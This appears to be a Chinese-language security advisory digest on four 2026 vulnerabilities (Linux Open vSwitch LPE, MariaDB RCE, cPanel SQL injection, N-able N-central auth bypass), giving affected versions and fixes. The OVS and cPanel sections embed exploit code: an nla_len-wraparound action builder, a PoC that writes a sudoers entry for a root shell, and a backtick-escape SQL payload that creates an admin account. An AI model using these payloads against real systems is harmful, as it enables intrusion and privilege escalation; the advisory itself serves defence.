### 1. CVE-2026-64531：Linux 内核 Open vSwitch 本地提权（OVSwrap）

- **类型**：本地权限提升（LPE），普通用户 → root
- **触发条件**：普通用户 + `unshare -Urn`（无需初始命名空间权限）；系统加载 openvswitch 内核模块且启用 conntrack/FTP helper
- **CWE**：未披露（NVD 未收录 weakness）
- **ATT&CK**：T1068: Exploitation for Privilege Escalation
- **技术原理**：OVS 生成的嵌套 action 流超过 65535 字节时，16 位 `nla_len` 字段发生回绕。攻击者仅在私有用户/网络命名空间持有 `CAP_NET_ADMIN` 即可构造超长 CLONE action，使内核解析器落入攻击者控制的 conntrack 数据，获得**任意内核读**与**逐字递减**原语，最终篡改自身凭据提权到 root。
- **受影响/修复版本**：

| 内核系列 | 受影响范围 | 首个修复版本 |
|---|---|---|
| 5.15.y | 5.15.180 – 5.15.211 | 5.15.212 |
| 6.1.y | 6.1.132 – 6.1.177 | 6.1.178 |
| 6.6.y | 6.6.84 – 6.6.144 | 6.6.145 |
| 6.12.y | 6.12.20 – 6.12.96 | 6.12.97 |
| 6.18.y | 6.18.0 – 6.18.39 | 6.18.40 |
| 7.1.y | 7.1.0 – 7.1.4 | 7.1.5 |

!!! warning "风险提示"
    6.13–6.17、6.19、7.0 系列已 EOL，无修复；PoC 覆盖约 800 个 x86-64 内核构建，默认发行版（含 OVS 模块+conntrack）普遍受影响。奇安信 CERT 已复现该漏洞。

!!! tip "修复建议"
    1. 升级至上表"首个修复版本"及之后的内核（上游修复 commit `3f1f755366687d051174739fb99f7d560202f60b`）；
    2. 无法升级时，临时禁用非特权用户命名空间（`kernel.unprivileged_userns_clone=0`）或卸载 openvswitch 模块；
    3. 修复前在可销毁的虚拟机中验证 PoC，勿在生产环境复现。

!!! poc "POC / EXP（来源：HackSpeak/CVE-2026-64531，原 PoC：manizada/OVSwrap）"
    完整 PoC 脚本（约 100 KB，含 800 个内核构建偏移表）见 [HackSpeak/CVE-2026-64531](https://github.com/HackSpeak/CVE-2026-64531)。核心利用构造如下（摘自原 PoC）：

    ```bash
    # 必须以普通（非 root）用户运行；脚本自动 unshare -Urn 进入私有命名空间
    python3 ovswrap-poc.py
    # 成功后写入 /etc/sudoers.d/ 条目获得免密 root shell
    ```

    ```python
    # 核心：构造 nla_len 字段回绕的伪造 SET action（labels 内嵌假 action）
    def clone_with_fake_set_timeout(tun_dst: int) -> bytes:
        labels = bytearray(32)
        labels[20:24] = struct.pack(NLA_HDR, 0xFFFF, OVS_ACTION_ATTR_SET)  # nla_len 回绕
        labels[24:28] = struct.pack(NLA_HDR, 12, OVS_KEY_ATTR_TUNNEL_INFO)
        labels[28:32] = struct.pack("<I", tun_dst & 0xFFFFFFFF)
        timeout = bytearray(32)
        timeout[0:4] = struct.pack("<I", (tun_dst >> 32) & 0xFFFFFFFF)
        payload = nla(OVS_CT_ATTR_LABELS, bytes(labels))
        payload += nla(OVS_CT_ATTR_TIMEOUT, bytes(timeout))
        return nla(
            OVS_ACTION_ATTR_CLONE,
            ct_action(payload) + ct_action() * (CT_ACTION_COUNT - 1),
        )
    ```

### 2. QVD-2026-48306：MariaDB 认证远程代码执行漏洞

- **类型**：认证后远程代码执行（攻击全程仅使用 SQL 语句）
- **影响组件**：MariaDB 10.6.27 ~ 13.0.1（已发布版本）；13.0.1-rc 完整 RCE 已复现；GRANT PROXY、存储过程/函数、LOAD DATA INFILE 均默认开启
- **危害等级**：高危（CVSS 3.1：8.8），奇安信评级高危，影响量级十万级
- **CWE**：未披露（厂商通告未给出）
- **ATT&CK**：T1210: Exploitation of Remote Services
- **技术原理**：组合利用 F-09（GRANT PROXY 权限提升）与 F-05（SYS_REFCURSOR 释放后使用）：任意低权限账号（即使仅 USAGE 权限）可通过一条 GRANT PROXY 语句提权至 DBA，进而利用存储过程/游标相关内存释放缺陷触发 UAF，最终在 mariadbd 进程中执行任意系统命令（uid 999/mysql），获取服务器主机控制权。
- **暴露面**：奇安信鹰图测绘显示国内风险资产 17,437 个（IP 17,104），全球风险资产 520,605 个（IP 495,365）。
- **POC 状态**：通告称 PoC 与技术细节已公开；本次 GitHub 检索（QVD-2026-48306 / MariaDB SYS_REFCURSOR）未发现公开仓库，未获取可内嵌代码。

!!! tip "修复建议"
    1. 运行 13.0.1-rc 等 rc/开发版本的环境立即回退或升级至受支持稳定版本；
    2. 限制 3306 端口仅对受信任内网/主机开放；
    3. 业务允许时，通过最小授权禁用/限制高风险存储过程/函数创建与 `FILE` 权限。

### 3. CVE-2026-58048：cPanel 数据库权限提升漏洞（root SQL 执行）

- **类型**：SQL 注入 / 权限提升（已认证用户 → MySQL root）
- **影响组件**：cPanel < 11.110.0.137、11.118.0.71、11.126.0.78、11.134.0.48、11.136.0.32；WP Squared < 11.138.1.6
- **危害等级**：严重（CVSS 4.0：9.4）
- **CWE**：CWE-89（SQL 注入）
- **ATT&CK**：T1068: Exploitation for Privilege Escalation
- **技术原理**：cPanel 以 root 身份执行数据库重命名操作时，未正确保留用户会话的 `sql_mode`（ANSI_QUOTES），数据库名中的反引号可逃逸标识符边界注入任意 SQL。已验证载荷可将权限提升至 DBA 并创建管理员账号、读写服务器文件（LOAD_FILE / INTO OUTFILE）乃至 UDF 命令执行。
- **披露**：Vincent55 Yang（经 HackerOne）发现，2026-07-31 披露。

!!! danger "严重漏洞"
    共享主机场景下，任意已认证的普通托管客户即可获得 MySQL root 权限；结合写 Web 目录（INTO OUTFILE）或 UDF，可进一步升级为操作系统级失陷。

!!! tip "修复建议"
    1. 升级至 cPanel 11.110.0.137 / 11.118.0.71 / 11.126.0.78 / 11.134.0.48 / 11.136.0.32 或 WP Squared 11.138.1.6 及以上；
    2. 临时缓解：回收 cPanel 用户的 MySQL 功能（Database 功能）；
    3. 排查已有 `rce`/异常管理员账号与 Web shell。

!!! poc "POC / EXP（来源：imbas007/POC-CVE-2026-58048）"
    完整 PoC（poc.py + Docker 靶场 simulate.py）见 [imbas007/POC-CVE-2026-58048](https://github.com/imbas007/POC-CVE-2026-58048)。核心注入载荷构造如下：

    ```python
    class PayloadGenerator:
        """Generate SQL injection payloads for the backtick-escape technique."""

        @staticmethod
        def backtick_escape(base_name: str, injected_sql: str) -> str:
            # cPanel 以 root 执行: CREATE DATABASE `user_input`;
            # ANSI_QUOTES 模式下反引号失去标识符定界符语义，
            # 首个反引号闭合标识符，其余内容被当作 SQL 执行。
            full_payload = f"`; {injected_sql}; -- "
            available = 64 - len(full_payload)  # MySQL 库名最长 64 字符
            if available < 1:
                base_name = "x"
            elif len(base_name) > available:
                base_name = base_name[:available]
            return f"{base_name}{full_payload}"

        @staticmethod
        def create_admin_user(user: str, password: str, host: str = "%") -> str:
            return (
                f"GRANT ALL PRIVILEGES ON *.* TO '{user}'@{host} "
                f"IDENTIFIED BY '{password}' WITH GRANT OPTION"
            )
    ```

    ```bash
    # 示例载荷: name: db`; GRANT ALL ON *.* TO 'rce'@'%' IDENTIFIED BY 'pwned!'; --
    # 本地 Docker 靶场验证
    pip install -r requirements.txt
    python3 simulate.py start        # MariaDB:13306, cPanel API:18080, Apache:18081
    python3 poc.py -t http://localhost:18080 --mysql-port 13306 --payload admin-user --verify
    python3 simulate.py stop
    # 真实目标

    ```

### 4. CVE-2026-18577：N-able N-central 认证绕过漏洞（KEV，在野利用）

- **类型**：认证绕过 / 账户接管
- **影响组件**：N-able N-central 至 2026.3.1 版本（修复版本 2026.3.1.7）
- **危害等级**：高危（CISA/厂商 CVSS 8.2；NVD CVSS 3.1：8.1）
- **CWE**：CWE-288（使用替代路径/通道的认证绕过）
- **ATT&CK**：T1078: Valid Accounts / T1190: Exploit Public-Facing Application
- **技术原理**：该漏洞为 CVE-2026-18576（认证绕过，影响至 2026.1 版本）补丁不完整所致；远程攻击者可绕过认证接管账户，获取 N-central 服务器管理权限，进而借助内置 Take Control 功能横向进入受管端点并建立持久化访问（攻击者活动包括侦察、定位域控、横向移动）。
- **在野利用**：Huntress 等已观察到多起在野利用；8 月 2 日 N-able 发布安全公告，CISA 已将其加入 KEV 目录。
- **POC 状态**：未发现公开 POC（GitHub 检索 0 结果）；该漏洞已在野利用，建议按在野攻击指标排查。

!!! warning "高危漏洞"
    该漏洞正被积极利用且补丁曾被绕过，属于"打了补丁也不安全"的典型场景。所有使用 N-central 的 MSSP/IT 服务商应立即升级并排查受管端点。

!!! tip "修复建议"
    1. 立即升级至 N-central 2026.3.1.7 或更高版本；
    2. 按厂商公告排查可疑 `svchost.exe`、Cloudflared 服务及已知恶意 IP 连接；
    3. 核查 N-central 服务器及受管端点是否存在新增账户/异常计划任务。
